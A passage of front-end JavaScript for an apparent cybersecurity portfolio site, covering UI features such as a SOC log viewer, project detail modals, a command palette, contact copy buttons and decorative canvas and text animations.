    const termBody = document.getElementById('term-body');
    if (termBody) termBody.scrollTop = termBody.scrollHeight;
  }

  // Handle form submit
  termForm?.addEventListener('submit', (e) => {
    e.preventDefault();
    const cmd = termInput.value;
    termInput.value = '';
    executeCommand(cmd);
  });

  // Handle chips
  termChips?.addEventListener('click', (e) => {
    const chip = e.target.closest('.term-chip');
    if (chip && chip.dataset.cmd) {
      executeCommand(chip.dataset.cmd);
      termInput.focus();
    }
  });

  // Keyboard navigation for history
  termInput.addEventListener('keydown', (e) => {
    if (e.key === 'ArrowUp') {
      if (historyIndex > 0) {
        historyIndex--;
        termInput.value = commandHistory[historyIndex] || '';
      }
    } else if (e.key === 'ArrowDown') {
      if (historyIndex < commandHistory.length - 1) {
        historyIndex++;
        termInput.value = commandHistory[historyIndex] || '';
      } else {
        historyIndex = commandHistory.length;
        termInput.value = '';
      }
    }
  });
}

function escapeHtml(str) {
  return str.replace(/[&<>"']/g, m => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  })[m]);
}

/* ═══════════════════════════════════════
   6. INTERACTIVE SOC TELEMETRY INVESTIGATOR
   ═══════════════════════════════════════ */
function setupSocInvestigator() {
  const logListEl = document.getElementById('soc-log-list');
  const filterBar = document.getElementById('soc-filter-bar');
  const searchInput = document.getElementById('soc-search-input');
  const searchClear = document.getElementById('soc-search-clear');
  const countBadge = document.getElementById('soc-count-badge');
  if (!logListEl) return;

  let activeVector = 'all';
  let searchQuery = '';
  let selectedEventId = socEventsData[0].id;

  function getFilteredEvents() {
    return socEventsData.filter(evt => {
      const matchVector = activeVector === 'all' || evt.vector === activeVector;
      const q = searchQuery.toLowerCase().trim();
      const matchSearch = !q ||
        evt.sourceIp.toLowerCase().includes(q) ||
        evt.asn.toLowerCase().includes(q) ||
        evt.port.toLowerCase().includes(q) ||
        evt.title.toLowerCase().includes(q) ||
        evt.signature.toLowerCase().includes(q) ||
        evt.mitre.toLowerCase().includes(q);
      return matchVector && matchSearch;
    });
  }

  function renderEventList() {
    const filtered = getFilteredEvents();
    if (countBadge) {
      countBadge.textContent = `Showing ${filtered.length} of ${socEventsData.length} Events`;
    }

    if (filtered.length === 0) {
      logListEl.innerHTML = `
        <div class="soc-empty">
          <p>No telemetry events match your filter query.</p>
          <button class="btn btn-sm" id="btn-reset-soc-filter">Reset Filters</button>
        </div>
      `;
      document.getElementById('btn-reset-soc-filter')?.addEventListener('click', () => {
        activeVector = 'all';
        searchQuery = '';
        if (searchInput) searchInput.value = '';
        filterBar.querySelectorAll('.soc-tab').forEach(t => t.classList.toggle('active', t.dataset.vector === 'all'));
        renderEventList();
      });
      return;
    }

    // Ensure selectedEventId is still in filtered list
    if (!filtered.some(e => e.id === selectedEventId)) {
      selectedEventId = filtered[0].id;
    }

    logListEl.innerHTML = filtered.map(evt => `
      <div class="soc-log-item ${evt.id === selectedEventId ? 'selected' : ''}" data-id="${evt.id}" role="option" tabindex="0">
        <div class="soc-log-top">
          <span class="badge-sev ${evt.severity}">${evt.severityLabel}</span>
          <span class="soc-log-vector">${evt.vectorLabel}</span>
          <time class="soc-log-time">${evt.timestamp.split(' ')[1]}</time>
        </div>
        <div class="soc-log-title">${evt.title}</div>
        <div class="soc-log-meta">
          <span class="soc-ip mono">${evt.sourceIp}</span>
          <span class="soc-port">${evt.port}</span>
          <span class="soc-asn-short">${evt.asn.split(' ')[0]}</span>
        </div>
      </div>
    `).join('');

    renderInspector(socEventsData.find(e => e.id === selectedEventId) || filtered[0]);
  }

  function renderInspector(evt) {
    if (!evt) return;

    const sevEl = document.getElementById('insp-severity');
    const vecEl = document.getElementById('insp-vector');
    const timeEl = document.getElementById('insp-time');
    const titleEl = document.getElementById('insp-title');
    const ipEl = document.getElementById('insp-ip');
    const asnEl = document.getElementById('insp-asn');
    const portEl = document.getElementById('insp-port');
    const mitreEl = document.getElementById('insp-mitre');
    const payloadEl = document.getElementById('insp-payload');
    const notesEl = document.getElementById('insp-notes');
    const mitEl = document.getElementById('insp-mitigation');

    if (sevEl) {
      sevEl.className = `badge-sev ${evt.severity}`;
      sevEl.textContent = evt.severityLabel;
    }
    if (vecEl) vecEl.textContent = evt.vectorLabel;
    if (timeEl) timeEl.textContent = evt.timestamp;
    if (titleEl) titleEl.textContent = evt.title;
    if (ipEl) ipEl.textContent = evt.sourceIp;
    if (asnEl) asnEl.textContent = evt.asn;
    if (portEl) portEl.textContent = evt.port;
    if (mitreEl) mitreEl.textContent = evt.mitre;
    if (payloadEl) payloadEl.textContent = evt.payload;
    if (notesEl) notesEl.textContent = evt.analystNotes;
    if (mitEl) mitEl.textContent = evt.mitigation;

    // Attach copy actions
    const btnCopyIp = document.getElementById('btn-copy-ip');
    if (btnCopyIp) {
      btnCopyIp.onclick = () => copyToClipboard(evt.sourceIp, `Copied IP (${evt.sourceIp}) to clipboard!`);
    }

    const btnCopyIoc = document.getElementById('btn-copy-ioc');
    if (btnCopyIoc) {
      btnCopyIoc.onclick = () => {
        const fullIoc = `=== SOC INCIDENT REPORT ===\nTitle: ${evt.title}\nSeverity: ${evt.severityLabel}\nTimestamp: ${evt.timestamp}\nSource IP: ${evt.sourceIp} (${evt.asn})\nTarget: ${evt.port}\nMITRE ATT&CK: ${evt.mitre}\nSignature: ${evt.signature}\nAnalyst Notes: ${evt.analystNotes}\nMitigation: ${evt.mitigation}`;
        copyToClipboard(fullIoc, `Copied full IOC report for ${evt.sourceIp} to clipboard!`);
      };
    }
  }

  // Click on log item
  logListEl.addEventListener('click', (e) => {
    const item = e.target.closest('.soc-log-item');
    if (item && item.dataset.id) {
      selectedEventId = item.dataset.id;
      logListEl.querySelectorAll('.soc-log-item').forEach(i => i.classList.toggle('selected', i.dataset.id === selectedEventId));
      renderInspector(socEventsData.find(evt => evt.id === selectedEventId));
    }
  });

  // Filter tabs
  filterBar?.addEventListener('click', (e) => {
    const tab = e.target.closest('.soc-tab');
    if (tab && tab.dataset.vector) {
      filterBar.querySelectorAll('.soc-tab').forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      activeVector = tab.dataset.vector;
      renderEventList();
    }
  });

  // Search input
  searchInput?.addEventListener('input', (e) => {
    searchQuery = e.target.value;
    renderEventList();
  });

  searchClear?.addEventListener('click', () => {
    if (searchInput) searchInput.value = '';
    searchQuery = '';
    renderEventList();
  });

  // Initial render
  renderEventList();
}

/* ═══════════════════════════════════════
   7. PROJECT QUICK VIEW MODAL
   ═══════════════════════════════════════ */
function setupProjectModal() {
  const modal = document.getElementById('project-modal');
  const closeBtn = document.getElementById('modal-close-btn');
  const dismissBtn = document.getElementById('modal-dismiss-btn');
  const tabs = document.querySelectorAll('.modal-tab');
  const panels = document.querySelectorAll('.tab-panel');
  if (!modal) return;

  let currentProject = null;

  function openModal(projectId, initialTab = 'overview') {
    const project = projectData[projectId];
    if (!project) return;
    currentProject = project;

    const badgeEl = document.getElementById('modal-badge');
    const titleEl = document.getElementById('modal-title');
    const summaryEl = document.getElementById('modal-summary');
    const pointsList = document.getElementById('modal-points');
    const techWrap = document.getElementById('modal-tech');
    const ruleTypeEl = document.getElementById('modal-rule-type');
    const ruleCodeEl = document.getElementById('modal-rule-code');
    const repoLink = document.getElementById('modal-repo-link');
    const deepLink = document.getElementById('modal-deep-link');
    const mitreWrap = document.getElementById('modal-mitre-content');
    const takeawaysWrap = document.getElementById('modal-takeaways-content');

    if (badgeEl) badgeEl.textContent = project.badge;
    if (titleEl) titleEl.textContent = project.name;
    if (summaryEl) summaryEl.textContent = project.summary;
    if (repoLink) repoLink.href = project.repo;
    if (deepLink) deepLink.href = `project-detail.html?project=${project.id}`;

    if (pointsList) {
      pointsList.innerHTML = project.points.map(pt => `<li>${pt}</li>`).join('');
    }
    if (techWrap) {
      techWrap.innerHTML = project.tech.map(t => `<span>${t}</span>`).join('');
    }

    if (ruleTypeEl) ruleTypeEl.textContent = project.ruleType || 'DETECTION ARTIFACT';
    if (ruleCodeEl) ruleCodeEl.textContent = project.ruleCode || '// No rule code available';

    // Copy rule button
    const copyRuleBtn = document.getElementById('btn-copy-modal-rule');
    if (copyRuleBtn) {
      copyRuleBtn.onclick = () => copyToClipboard(project.ruleCode, 'Copied detection rule code to clipboard!');
    }

    // MITRE Content
    if (mitreWrap) {
      if (project.mitreTactics && project.mitreTactics.length > 0) {
        mitreWrap.innerHTML = `
          <table class="mitre-table">
            <thead>
              <tr><th>Technique ID</th><th>Name / Adversary Behavior</th><th>Kill-Chain Phase</th></tr>
            </thead>
            <tbody>
              ${project.mitreTactics.map(m => `
                <tr>
                  <td><span class="mitre-id">${m.id}</span></td>
                  <td><b>${m.name}</b></td>
                  <td><span class="phase-badge">${m.phase}</span></td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        `;
      } else {
        mitreWrap.innerHTML = '<p>MITRE ATT&CK mapping documented in GitHub repository.</p>';
      }
    }

    // Takeaways Content
    if (takeawaysWrap) {
      if (project.takeaways && project.takeaways.length > 0) {
        takeawaysWrap.innerHTML = `
          <ul class="takeaways-list">
            ${project.takeaways.map(t => `<li>${t}</li>`).join('')}
          </ul>
        `;
      } else {
        takeawaysWrap.innerHTML = '<p>Takeaways documented in full report.</p>';
      }
    }

    // Topology Content
    const topoBox = document.getElementById('modal-topology-box');
    if (topoBox) {
      if (project.topology && project.topology.length > 0) {
        topoBox.innerHTML = `
          <div class="topo-flow">
            ${project.topology.map((node, i) => `
              <div class="topo-node">
                <span class="topo-badge">${node.step}</span>
                <h4>${node.title}</h4>
                <p>${node.desc}</p>
              </div>
              ${i < project.topology.length - 1 ? '<div class="topo-arrow">➔</div>' : ''}
            `).join('')}
          </div>
        `;
      } else {
        topoBox.innerHTML = '<p>Topology diagram documented in project repository.</p>';
      }
    }

    // Switch to initial tab
    tabs.forEach(t => t.classList.toggle('active', t.dataset.tab === initialTab));
    panels.forEach(p => p.classList.toggle('active', p.id === `tab-${initialTab}`));

    modal.classList.add('active');
    modal.setAttribute('aria-hidden', 'false');
    document.body.style.overflow = 'hidden';
  }

  function closeModal() {
    modal.classList.remove('active');
    modal.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
  }

  // Quick inspect & topology button triggers
  document.querySelectorAll('.btn-quick-view').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      const pId = btn.dataset.modal;
      const tab = btn.dataset.tab || 'overview';
      openModal(pId, tab);
    });
  });

  // Card click triggers (if clicking card surface)
  document.querySelectorAll('.project-grid .project').forEach(card => {
    card.addEventListener('click', (e) => {
      if (e.target.closest('a') || e.target.closest('button')) return;
      const pId = card.dataset.project;
      if (pId) openModal(pId);
    });
  });

  closeBtn?.addEventListener('click', closeModal);
  dismissBtn?.addEventListener('click', closeModal);

  modal.addEventListener('click', (e) => {
    if (e.target === modal) closeModal();
  });

  window.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && modal.classList.contains('active')) {
      closeModal();
    }
  });

  // Tab switching
  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      tabs.forEach(t => t.classList.remove('active'));
      panels.forEach(p => p.classList.remove('active'));
      tab.classList.add('active');
      const targetPanel = document.getElementById(`tab-${tab.dataset.tab}`);
      if (targetPanel) targetPanel.classList.add('active');
    });
  });

  window.openProjectModal = openModal;
}

/* ═══════════════════════════════════════
   8. SKILLS MATRIX FILTER
   ═══════════════════════════════════════ */
function setupSkillsFilter() {
  const catButtons = document.querySelectorAll('.skill-cat-btn');
  const skillCards = document.querySelectorAll('.skills-matrix .skill-card');

  catButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      catButtons.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');

      const category = btn.dataset.skillCat;
      skillCards.forEach(card => {
        if (category === 'all' || card.dataset.cat === category) {
          card.classList.remove('hidden');
          card.style.animation = 'none';
          setTimeout(() => { card.style.animation = ''; }, 10);
        } else {
          card.classList.add('hidden');
        }
      });
    });
  });
}

/* ═══════════════════════════════════════
   9. COMMAND PALETTE (CTRL+K)
   ═══════════════════════════════════════ */
function setupCommandPalette() {
  const palette = document.getElementById('cmd-palette');
  const triggerBtn = document.getElementById('cmd-palette-btn');
  const input = document.getElementById('cmd-input');
  const list = document.getElementById('cmd-list');
  if (!palette || !input || !list) return;

  const paletteItems = [
    { label: 'Jump to Hero', section: '#home', cat: 'Navigation' },
    { label: 'Jump to About Me', section: '#about', cat: 'Navigation' },
    { label: 'Jump to Experience & Timeline', section: '#experience', cat: 'Navigation' },
    { label: 'Jump to Security Projects', section: '#projects', cat: 'Navigation' },
    { label: 'Jump to Live SOC Telemetry Investigator', section: '#soc-investigator', cat: 'Navigation' },
    { label: 'Jump to Technical Skills', section: '#skills', cat: 'Navigation' },
    { label: 'Jump to Education & Certifications', section: '#education', cat: 'Navigation' },
    { label: 'Jump to Contact Section', section: '#contact', cat: 'Navigation' },
    { label: 'Inspect T-Pot Multi-Honeypot SOC Assessment (Flagship)', action: () => window.openProjectModal?.('tpot-soc-assessment'), cat: 'Project' },
    { label: 'Inspect Splunk SIEM Incident Investigation: Operation BlackByte (Flagship)', action: () => window.openProjectModal?.('splunk-soc-incident-investigation'), cat: 'Project' },
    { label: 'Inspect Phishing Email Investigation & OSINT', action: () => window.openProjectModal?.('phishing-osint'), cat: 'Project' },
    { label: 'Copy Email Address (groverdevanshu623@gmail.com)', action: () => copyToClipboard('groverdevanshu623@gmail.com', 'Copied email to clipboard!'), cat: 'Contact' },
    { label: 'Copy Phone Number (+44 7586 395777)', action: () => copyToClipboard('+44 7586 395777', 'Copied phone number to clipboard!'), cat: 'Contact' },
    { label: 'Open LinkedIn Profile ↗', action: () => window.open('https://www.linkedin.com/in/devanshugrover-22b097208', '_blank'), cat: 'Social' },
    { label: 'Open GitHub Profile ↗', action: () => window.open('https://github.com/Dgrover07', '_blank'), cat: 'Social' }
  ];

  let selectedIndex = 0;
  let filteredItems = [...paletteItems];

  function renderList() {
    if (filteredItems.length === 0) {
      list.innerHTML = '<div class="cmd-empty">No matching actions found.</div>';
      return;
    }

    list.innerHTML = filteredItems.map((item, i) => `
      <div class="cmd-item ${i === selectedIndex ? 'selected' : ''}" data-index="${i}">
        <span class="cmd-item-label">${item.label}</span>
        <span class="cmd-item-cat">${item.cat}</span>
      </div>
    `).join('');

    const activeEl = list.children[selectedIndex];
    if (activeEl) activeEl.scrollIntoView({ block: 'nearest' });
  }

  function openPalette() {
    palette.classList.add('active');
    palette.setAttribute('aria-hidden', 'false');
    input.value = '';
    selectedIndex = 0;
    filteredItems = [...paletteItems];
    renderList();
    setTimeout(() => input.focus(), 50);
  }

  function closePalette() {
    palette.classList.remove('active');
    palette.setAttribute('aria-hidden', 'true');
  }

  function executeItem(item) {
    closePalette();
    if (item.action) {
      item.action();
    } else if (item.section) {
      const target = document.querySelector(item.section);
      if (target) target.scrollIntoView({ behavior: 'smooth' });
    }
  }

  triggerBtn?.addEventListener('click', openPalette);
  palette.addEventListener('click', (e) => {
    if (e.target === palette) closePalette();
  });

  input.addEventListener('input', () => {
    const q = input.value.toLowerCase().trim();
    filteredItems = paletteItems.filter(item => 
      item.label.toLowerCase().includes(q) || item.cat.toLowerCase().includes(q)
    );
    selectedIndex = 0;
    renderList();
  });

  input.addEventListener('keydown', (e) => {
    if (e.key === 'ArrowDown') {
      e.preventDefault();
      selectedIndex = (selectedIndex + 1) % filteredItems.length;
      renderList();
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      selectedIndex = (selectedIndex - 1 + filteredItems.length) % filteredItems.length;
      renderList();
    } else if (e.key === 'Enter') {
      e.preventDefault();
      if (filteredItems[selectedIndex]) {
        executeItem(filteredItems[selectedIndex]);
      }
    } else if (e.key === 'Escape') {
      closePalette();
    }
  });

  list.addEventListener('click', (e) => {
    const itemEl = e.target.closest('.cmd-item');
    if (itemEl) {
      const idx = parseInt(itemEl.dataset.index, 10);
      if (filteredItems[idx]) {
        executeItem(filteredItems[idx]);
      }
    }
  });

  // Global shortcut Ctrl+K / Cmd+K
  window.addEventListener('keydown', (e) => {
    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
      e.preventDefault();
      if (palette.classList.contains('active')) {
        closePalette();
      } else {
        openPalette();
      }
    }
  });
}

/* ═══════════════════════════════════════
   10. CONTACT COPY BUTTONS
   ═══════════════════════════════════════ */
function setupContactCopy() {
  const emailCard = document.getElementById('card-copy-email') || document.getElementById('btn-copy-email');
  const phoneCard = document.getElementById('card-copy-phone') || document.getElementById('btn-copy-phone');

  if (emailCard) {
    emailCard.addEventListener('click', () => {
      copyToClipboard('groverdevanshu623@gmail.com', 'Copied email (groverdevanshu623@gmail.com) to clipboard!');
    });
    emailCard.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        copyToClipboard('groverdevanshu623@gmail.com', 'Copied email (groverdevanshu623@gmail.com) to clipboard!');
      }
    });
  }

  if (phoneCard) {
    phoneCard.addEventListener('click', () => {
      copyToClipboard('+44 7586 395777', 'Copied phone number (+44 7586 395777) to clipboard!');
    });
    phoneCard.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        copyToClipboard('+44 7586 395777', 'Copied phone number (+44 7586 395777) to clipboard!');
      }
    });
  }
}

/* ═══════════════════════════════════════
   11. DYNAMIC SPOTLIGHT HOVER EFFECT
   ═══════════════════════════════════════ */
function setupSpotlightEffect() {
  const cards = document.querySelectorAll('.card-spotlight');
  cards.forEach(card => {
    card.addEventListener('mousemove', (e) => {
      const rect = card.getBoundingClientRect();
      const x = e.clientX - rect.left;
      const y = e.clientY - rect.top;
      card.style.setProperty('--mouse-x', `${x}px`);
      card.style.setProperty('--mouse-y', `${y}px`);
    });
  });
}

/* ═══════════════════════════════════════
   12. ACTIVE SCROLL NAVIGATION OBSERVER
   ═══════════════════════════════════════ */
function setupScrollEngine() {
  const sections = document.querySelectorAll('section[id]');
  const navLinks = document.querySelectorAll('#nav-links a');

  const sectionObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const id = entry.target.getAttribute('id');
        navLinks.forEach(link => {
          link.classList.toggle('active', link.getAttribute('href') === `#${id}`);
        });
      }
    });
  }, { threshold: 0.2, rootMargin: '-76px 0px -40% 0px' });

  sections.forEach(s => sectionObserver.observe(s));
}

/* ═══════════════════════════════════════
   13. ANIMATED COUNTERS & OBSERVERS
   ═══════════════════════════════════════ */
function animateStats() {
  const statNumbers = document.querySelectorAll('.stat-number');
  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const el = entry.target;
        const target = parseInt(el.dataset.count, 10);
        let current = 0;
        const increment = Math.max(1, Math.ceil(target / 45));
        const timer = setInterval(() => {
          current += increment;
          if (current >= target) {
            el.textContent = target.toLocaleString();
            clearInterval(timer);
          } else {
            el.textContent = current.toLocaleString();
          }
        }, 25);
        observer.unobserve(el);
      }
    });
  }, { threshold: 0.4 });

  statNumbers.forEach(el => observer.observe(el));
}

/* ═══════════════════════════════════════
   14. PROJECT CATEGORY FILTER
   ═══════════════════════════════════════ */
function setupProjectFilters() {
  const filterTags = document.querySelectorAll('.filter-tag');
  const projects = document.querySelectorAll('.project-grid .project');

  filterTags.forEach(tag => {
    tag.addEventListener('click', () => {
      filterTags.forEach(t => t.classList.remove('active'));
      tag.classList.add('active');

      const filter = tag.dataset.filter;
      projects.forEach(project => {
        if (filter === 'all' || project.dataset.filter === filter) {
          project.classList.remove('hidden');
          project.style.animation = 'none';
          setTimeout(() => { project.style.animation = ''; }, 10);
        } else {
          project.classList.add('hidden');
        }
      });
    });
  });
}

/* ═══════════════════════════════════════
   15. MOBILE MENU TOGGLE
   ═══════════════════════════════════════ */
function setupMobileMenu() {
  const menuBtn = document.getElementById('mobile-menu-btn');
  const navBar = document.getElementById('main-nav');
  menuBtn?.addEventListener('click', () => navBar?.classList.toggle('open'));
  document.querySelectorAll('#nav-links a').forEach(a => {
    a.addEventListener('click', () => navBar?.classList.remove('open'));
  });
}

/* ═══════════════════════════════════════
   16. STANDALONE PROJECT DETAIL PAGE LOADER
   ═══════════════════════════════════════ */
function renderProjectDetailPage() {
  const isDetailPage = document.body.dataset.page === 'project-detail';
  if (!isDetailPage) return;

  const projectId = new URLSearchParams(window.location.search).get('project') || 'tpot-soc-assessment';
  const project = projectData[projectId] || projectData['tpot-soc-assessment'];

  const nameEl = document.getElementById('project-name');
  const summaryEl = document.getElementById('project-summary');
  const descriptionEl = document.getElementById('project-description');
  const badgeEl = document.getElementById('project-status');
  const repoLink = document.getElementById('project-repo');
  const repoSecondary = document.getElementById('project-repo-secondary');
  const tagWrap = document.getElementById('project-tags');
  const pointsList = document.getElementById('project-points');
  const techList = document.getElementById('project-tech');
  const ruleTypeEl = document.getElementById('project-rule-type');
  const ruleCodeEl = document.getElementById('project-rule-code');
  const mitreBodyEl = document.getElementById('project-mitre-body');
  const takeawaysListEl = document.getElementById('project-takeaways');
  const copyRuleBtn = document.getElementById('project-copy-rule');

  // Highlight active switcher pill
  document.querySelectorAll('.switcher-pill').forEach(pill => {
    const isThis = pill.dataset.projectId === projectId;
    pill.classList.toggle('primary', isThis);
    pill.classList.toggle('ghost', !isThis);
  });

  if (nameEl) nameEl.textContent = project.name;
  if (summaryEl) summaryEl.textContent = project.summary;
  if (descriptionEl) descriptionEl.textContent = project.description;
  if (badgeEl) badgeEl.textContent = project.badge;
  if (repoLink) repoLink.href = project.repo;
  if (repoSecondary) repoSecondary.href = project.repo;

  if (tagWrap) tagWrap.innerHTML = project.tags.map(tag => `<span>${tag}</span>`).join('');
  if (pointsList) pointsList.innerHTML = project.points.map(point => `<li>${point}</li>`).join('');
  if (techList) techList.innerHTML = project.tech.map(item => `<li>${item}</li>`).join('');

  if (ruleTypeEl && project.ruleType) ruleTypeEl.textContent = project.ruleType;
  if (ruleCodeEl && project.ruleCode) ruleCodeEl.textContent = project.ruleCode;

  if (mitreBodyEl && project.mitreTactics) {
    mitreBodyEl.innerHTML = project.mitreTactics.map(m => `
      <tr>
        <td><span class="mitre-id">${m.id}</span></td>
        <td>${m.name}</td>
        <td><span class="phase-badge">${m.phase}</span></td>
      </tr>
    `).join('');
  }

  // Populate Takeaways
  if (takeawaysListEl && project.takeaways) {
    takeawaysListEl.innerHTML = project.takeaways.map(t => `<li>${t}</li>`).join('');
  }

  // Populate Topology Diagram
  const topoBox = document.getElementById('modal-topology-box');
  if (topoBox && project.topology) {
    topoBox.innerHTML = `
      <div class="topo-flow">
        ${project.topology.map((node, i) => `
          <div class="topo-node">
            <span class="topo-badge">${node.step}</span>
            <h4>${node.title}</h4>
            <p>${node.desc}</p>
          </div>
          ${i < project.topology.length - 1 ? '<div class="topo-arrow">➔</div>' : ''}
        `).join('')}
      </div>
    `;
  }

  if (copyRuleBtn && project.ruleCode) {
    copyRuleBtn.addEventListener('click', () => {
      copyToClipboard(project.ruleCode, 'Detection rule copied to clipboard!');
    });
  }

  document.title = `${project.name} | Devanshu Grover`;
}

/* ═══════════════════════════════════════
   17. SCROLL REVEAL OBSERVER
   ═══════════════════════════════════════ */
function setupRevealObserver() {
  const elements = document.querySelectorAll('.reveal, .stagger');
  
  // Immediately reveal elements in viewport on load
  elements.forEach(el => {
    const rect = el.getBoundingClientRect();
    if (rect.top < window.innerHeight + 100) {
      el.classList.add('visible');
    }
  });

  if ('IntersectionObserver' in window) {
    const observer = new IntersectionObserver((entries) => {
      entries.forEach(e => {
        if (e.isIntersecting) {
          e.target.classList.add('visible');
        }
      });
    }, { threshold: 0.05, rootMargin: '0px 0px 50px 0px' });

    elements.forEach(el => observer.observe(el));
  } else {
    elements.forEach(el => el.classList.add('visible'));
  }

  document.body.classList.add('js-ready');
}

/* ═══════════════════════════════════════
   18. INTERACTIVE CYBER PARTICLE CANVAS
   ═══════════════════════════════════════ */
function setupCyberCanvas() {
  const canvas = document.getElementById('cyber-canvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  if (!ctx) return;

  let width = (canvas.width = window.innerWidth);
  let height = (canvas.height = window.innerHeight);

  let mouse = { x: null, y: null, radius: 160 };

  window.addEventListener('mousemove', (e) => {
    mouse.x = e.clientX;
    mouse.y = e.clientY;
  }, { passive: true });

  window.addEventListener('mouseleave', () => {
    mouse.x = null;
    mouse.y = null;
  });

  window.addEventListener('resize', () => {
    width = canvas.width = window.innerWidth;
    height = canvas.height = window.innerHeight;
    initParticles();
  }, { passive: true });

  let particles = [];
  function initParticles() {
    particles = [];
    const count = Math.min(55, Math.floor((width * height) / 24000));
    for (let i = 0; i < count; i++) {
      particles.push({
        x: Math.random() * width,
        y: Math.random() * height,
        vx: (Math.random() - 0.5) * 0.5,
        vy: (Math.random() - 0.5) * 0.5,
        radius: Math.random() * 1.8 + 0.8,
        color: Math.random() > 0.25 ? 'rgba(56, 189, 248, ' : 'rgba(16, 185, 129, ',
        alpha: Math.random() * 0.45 + 0.2
      });
    }
  }

  initParticles();

  function animate() {
    ctx.clearRect(0, 0, width, height);

    // Draw connecting lines
    for (let i = 0; i < particles.length; i++) {
      for (let j = i + 1; j < particles.length; j++) {
        const dx = particles[i].x - particles[j].x;
        const dy = particles[i].y - particles[j].y;
        const dist = Math.hypot(dx, dy);
        if (dist < 130) {
          const opacity = (1 - dist / 130) * 0.16;
          ctx.beginPath();
          ctx.moveTo(particles[i].x, particles[i].y);
          ctx.lineTo(particles[j].x, particles[j].y);
          ctx.strokeStyle = `rgba(56, 189, 248, ${opacity})`;
          ctx.lineWidth = 0.75;
          ctx.stroke();
        }
      }
    }

    // Connect to mouse cursor
    if (mouse.x !== null && mouse.y !== null) {
      for (let i = 0; i < particles.length; i++) {
        const dx = mouse.x - particles[i].x;
        const dy = mouse.y - particles[i].y;
        const dist = Math.hypot(dx, dy);
        if (dist < mouse.radius) {
          const opacity = (1 - dist / mouse.radius) * 0.35;
          ctx.beginPath();
          ctx.moveTo(particles[i].x, particles[i].y);
          ctx.lineTo(mouse.x, mouse.y);
          ctx.strokeStyle = `rgba(0, 240, 255, ${opacity})`;
          ctx.lineWidth = 1;
          ctx.stroke();
          
          // Gentle movement towards/around mouse
          particles[i].x -= (dx / dist) * 0.6;
          particles[i].y -= (dy / dist) * 0.6;
        }
      }
    }

    // Draw particles
    for (let i = 0; i < particles.length; i++) {
      const p = particles[i];
      p.x += p.vx;
      p.y += p.vy;

      if (p.x < 0 || p.x > width) p.vx = -p.vx;
      if (p.y < 0 || p.y > height) p.vy = -p.vy;

      ctx.beginPath();
      ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
      ctx.fillStyle = p.color + p.alpha + ')';
      ctx.shadowBlur = 6;
      ctx.shadowColor = '#00f0ff';
      ctx.fill();
      ctx.shadowBlur = 0;
    }

    requestAnimationFrame(animate);
  }

  animate();
}

/* ═══════════════════════════════════════
   19. KINETIC TEXT SCRAMBLER (DECRYPTION EFFECT)
   ═══════════════════════════════════════ */
class TextScramble {
  constructor(el) {
    this.el = el;
    this.chars = '!<>-_\\/[]{}—=+*^?#________01';
    this.update = this.update.bind(this);
  }

  setText(newText) {
    const oldText = this.el.innerText;
    const length = Math.max(oldText.length, newText.length);
    const promise = new Promise((resolve) => (this.resolve = resolve));
    this.queue = [];
    for (let i = 0; i < length; i++) {
      const from = oldText[i] || '';
      const to = newText[i] || '';
      const start = Math.floor(Math.random() * 18);
      const end = start + Math.floor(Math.random() * 18);
      this.queue.push({ from, to, start, end });
    }
    cancelAnimationFrame(this.frameRequest);
    this.frame = 0;
    this.update();
    return promise;
  }

  update() {
    let output = '';
    let complete = 0;
    for (let i = 0, n = this.queue.length; i < n; i++) {
      let { from, to, start, end, char } = this.queue[i];
      if (this.frame >= end) {
        complete++;
        output += to;
      } else if (this.frame >= start) {
        if (!char || Math.random() < 0.28) {
          char = this.randomChar();
          this.queue[i].char = char;
        }
        output += `<span class="mono-highlight">${char}</span>`;
      } else {
        output += from;
      }
    }
    this.el.innerHTML = output;
    if (complete === this.queue.length) {
      this.resolve();
    } else {
      this.frameRequest = requestAnimationFrame(this.update);
      this.frame++;
    }
  }

  randomChar() {
    return this.chars[Math.floor(Math.random() * this.chars.length)];
  }
}

function setupTextScrambler() {
  const el = document.getElementById('scramble-role');
  if (!el) return;
  const phrases = [
    'SOC ANALYST (TIER 1/2)',
    'DETECTION ENGINEER',
    'THREAT HUNTER',
    'AWS CLOUD DEFENDER',
    'SIEM SPECIALIST'
  ];
  const fx = new TextScramble(el);
  let counter = 0;
  const next = () => {
    fx.setText(phrases[counter]).then(() => {
      setTimeout(next, 3200);
    });
    counter = (counter + 1) % phrases.length;
  };
  setTimeout(next, 1000);
}

/* ═══════════════════════════════════════
   20. SUBTLE 3D CARD TILT EFFECT
   ═══════════════════════════════════════ */
function setupCardTilt() {
  if (window.matchMedia('(prefers-reduced-motion: reduce)').matches || window.innerWidth < 900) return;
  const cards = document.querySelectorAll('.project, .stat-card, .portrait');
  cards.forEach((card) => {
    card.classList.add('card-tilt');
    card.addEventListener('mousemove', (e) => {
      const rect = card.getBoundingClientRect();
      const x = e.clientX - rect.left;
      const y = e.clientY - rect.top;
      const centerX = rect.width / 2;
      const centerY = rect.height / 2;
      const rotateX = ((y - centerY) / centerY) * -5;
      const rotateY = ((x - centerX) / centerX) * 5;
      card.style.transform = `perspective(1000px) rotateX(${rotateX.toFixed(2)}deg) rotateY(${rotateY.toFixed(2)}deg) translateY(-4px)`;
    });

    card.addEventListener('mouseleave', () => {
      card.style.transform = 'perspective(1000px) rotateX(0deg) rotateY(0deg) translateY(0px)';
      card.style.transition = 'transform 0.4s cubic-bezier(0.16, 1, 0.3, 1)';
    });

